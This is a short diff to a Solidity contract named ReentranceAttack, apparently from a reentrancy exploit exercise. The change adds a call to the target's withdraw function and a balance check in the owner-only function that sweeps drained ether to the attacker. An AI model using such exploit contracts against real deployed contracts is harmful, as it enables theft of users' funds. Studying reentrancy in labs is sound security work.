@@ -21,7 +21,8 @@ contract ReentranceAttack {
     }
     function withdrawFunds() public {
         require(msg.sender == owner, "Not authorized");
-        // require(address(this).balance > 0, "NO balance in this contract");
+        target.withdraw(amount);
+        require(address(this).balance > 0, "NO balance in this contract");
         (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
         require(success, "ETH transfer failed");
     }
